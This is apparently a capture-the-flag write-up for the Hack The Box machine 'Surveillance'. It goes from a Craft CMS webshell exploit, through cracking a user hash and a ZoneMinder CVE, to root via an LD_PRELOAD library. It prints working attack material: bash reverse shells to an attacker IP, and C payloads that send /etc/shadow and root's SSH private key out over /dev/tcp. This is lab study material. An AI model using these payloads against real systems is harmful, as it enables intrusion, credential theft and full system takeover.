# recon
CMS : _CRAFT CMS 4.4.14_
# foothold
```
└─$ python3 exp.py http://surveillance.htb
[+] Executing phpinfo to extract some config infos
temporary directory: /tmp
web server root: /var/www/html/craft/web
[+] create shell.php in /tmp
[+] trick imagick to move shell.php in /var/www/html/craft/web

[+] Webshell is deployed: http://surveillance.htb/shell.php?cmd=whoami
[+] Remember to delete shell.php in /var/www/html/craft/web when you're done

[!] Enjoy your shell

> bash -c "bash -i >& /dev/tcp/10.10.16.23/4444 0>&1"
```
```
www-data@surveillance:/tmp$ ls /home
```
	matthew
	zoneminder
```
find /var -name *backup* 2>/dev/null
```
	/var/www/html/craft/storage/backups
	/var/www/html/craft/vendor/craftcms/cms/src/web/assets/dbbackup
```
cat surveillance--2023-10-17-202801--v4.4.14.sql >& /dev/tcp/10.10.16.23/444 0>&1
```
```
www-data@surveillance:/tmp$ cat surveillance--2023-10-17-202801--v4.4.14.sql | grep users
```
	/*!40000 ALTER TABLE `users` DISABLE KEYS */;
	INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');

we get password
Mathhew : 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec
# privesc
```bash
└─$ john hash -w=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256                   
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
starcraft122490  (?) 
```
connect as matthew and creat ssh key
```bash
$ su matthew
matthew@surveillance:~$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/matthew/.ssh/id_rsa): 

Created directory '/home/matthew/.ssh'.
Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/matthew/.ssh/id_rsa
Your public key has been saved in /home/matthew/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:MeWPiUwKriG5kjzd2wGvjxQiyR6sC7hKspbEL90sZaY matthew@surveillance
The key's randomart image is:
+---[RSA 3072]----+
|          .      |
|         o       |
|    .   + .      |
|o... . + + +     |
|+*...o. S o .    |
|=*+oo++          |
|X==.Bo o         |
|=B.E.o= .        |
|B . .+.o         |
+----[SHA256]-----+
```

```bash
matthew@surveillance:~$ ss -tunl
Netid              State               Recv-Q              Send-Q                           Local Address:Port                           Peer Address:Port                                   
tcp                LISTEN              0                   511                                  127.0.0.1:8080
```

forward port with chisel 
```
matthew@surveillance:~$ ./chisel client 10.10.16.23:8000 R:127.0.0.1:8080
2024/05/04 21:07:44 client: Connecting to ws://10.10.16.23:8000
2024/05/04 21:07:47 client: Connected (Latency 140.423463ms)
```
or with ssh
```
─$ ssh matthew@surveillance.htb -L 1234:127.0.0.1:8080
```
## latteral movement
#ExploitZoneminder https://github.com/rvizx/CVE-2023-26035/blob/main/README.md
connected as zoneminder
## root
```bash
zoneminder@surveillance:~$ sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```

```bash
zoneminder@surveillance:~$ ls -la /usr/bin/zm[a-zA-Z]*.pl
-rwxr-xr-x 1 root root 43027 Nov 23  2022 /usr/bin/zmaudit.pl
-rwxr-xr-x 1 root root 12939 Nov 23  2022 /usr/bin/zmcamtool.pl
-rwxr-xr-x 1 root root  6043 Nov 23  2022 /usr/bin/zmcontrol.pl
-rwxr-xr-x 1 root root 26232 Nov 23  2022 /usr/bin/zmdc.pl
-rwxr-xr-x 1 root root 35206 Nov 23  2022 /usr/bin/zmfilter.pl
-rwxr-xr-x 1 root root  5640 Nov 23  2022 /usr/bin/zmonvif-probe.pl
-rwxr-xr-x 1 root root 19386 Nov 23  2022 /usr/bin/zmonvif-trigger.pl
-rwxr-xr-x 1 root root 13994 Nov 23  2022 /usr/bin/zmpkg.pl
-rwxr-xr-x 1 root root 17492 Nov 23  2022 /usr/bin/zmrecover.pl
-rwxr-xr-x 1 root root  4815 Nov 23  2022 /usr/bin/zmstats.pl
-rwxr-xr-x 1 root root  2133 Nov 23  2022 /usr/bin/zmsystemctl.pl
-rwxr-xr-x 1 root root 13111 Nov 23  2022 /usr/bin/zmtelemetry.pl
-rwxr-xr-x 1 root root  5340 Nov 23  2022 /usr/bin/zmtrack.pl
-rwxr-xr-x 1 root root 18482 Nov 23  2022 /usr/bin/zmtrigger.pl
-rwxr-xr-x 1 root root 45421 Nov 23  2022 /usr/bin/zmupdate.pl
-rwxr-xr-x 1 root root  8205 Nov 23  2022 /usr/bin/zmvideo.pl
-rwxr-xr-x 1 root root  7022 Nov 23  2022 /usr/bin/zmwatch.pl
-rwxr-xr-x 1 root root 19655 Nov 23  2022 /usr/bin/zmx10.pl
```

#ExploitZoneminderLD_PRELOAD  [LD_PRELOAD](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path)
```bash
zoneminder@surveillance:/tmp$ nano exp.c
```
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -c 'cat /etc/shadow >& /dev/tcp/10.10.16.23/4444 0>&1'");
}
```
```bash
zoneminder@surveillance:/tmp$ gcc -shared exp.c -o exp.so -nostartfiles
```
Save LD_PRELOAD in config page
```BASH
curl 'http://0.0.0.0:1234/?' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://0.0.0.0:1234' -H 'Connection: keep-alive' -H 'Referer: http://0.0.0.0:1234/?view=options&tab=config' -H 'Cookie: zmSkin=classic; zmCSS=base; ZMSESSID=4eb1j07mlmlgm6prfotvsgn6t5' -H 'Upgrade-Insecure-Requests: 1' --data-raw '__csrf_magic=key%3A08a1ea7a28bde8f734471f28f543affb2f37f266%2C1714868782&view=options&tab=config&action=options&newConfig%5BZM_TIMESTAMP_ON_CAPTURE%5D=1&newConfig%5BZM_TIMESTAMP_CODE_CHAR%5D=%25&newConfig%5BZM_CPU_EXTENSIONS%5D=1&newConfig%5BZM_FAST_IMAGE_BLENDS%5D=1&newConfig%5BZM_OPT_ADAPTIVE_SKIP%5D=1&newConfig%5BZM_MAX_SUSPEND_TIME%5D=30&newConfig%5BZM_STRICT_VIDEO_CONFIG%5D=1&newConfig%5BZM_LD_PRELOAD%5D=/tmp/exp.so&newConfig%5BZM_V4L_MULTI_BUFFER%5D=1&newConfig%5BZM_CAPTURES_PER_FRAME%5D=1&newConfig%5BZM_FORCED_ALARM_SCORE%5D=255&newConfig%5BZM_BULK_FRAME_INTERVAL%5D=100&newConfig%5BZM_EVENT_CLOSE_MODE%5D=idle&newConfig%5BZM_EVENT_IMAGE_DIGITS%5D=5&newConfig%5BZM_DEFAULT_ASPECT_RATIO%5D=4%3A3&newConfig%5BZM_FONT_FILE_LOCATION%5D=%2Fusr%2Fshare%2Fzoneminder%2Fwww%2Ffonts%2Fdefault.zmfnt'
```
shutdow the deamon and startup
```bash
zoneminder@surveillance:/tmp$ sudo /usr/bin/zmdc.pl shutdown zoneminder
zoneminder@surveillance:/tmp$ sudo /usr/bin/zmdc.pl startup zoneminder
```
And i receive /etc/shadow content on my local machine by listening `nc -lnvp 4444`

Modify exp.c to
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("yes "" | ssh-keygen -q -t rsa -N '' -f /root/.ssh/id_rsa;cat /root/.ssh/id_rsa.pub > /root/.ssh/authorized_keys;/bin/bash -c 'cat /root/.ssh/id_rsa >& /dev/tcp/10.10.16.23/4444 0>&1'");
}

```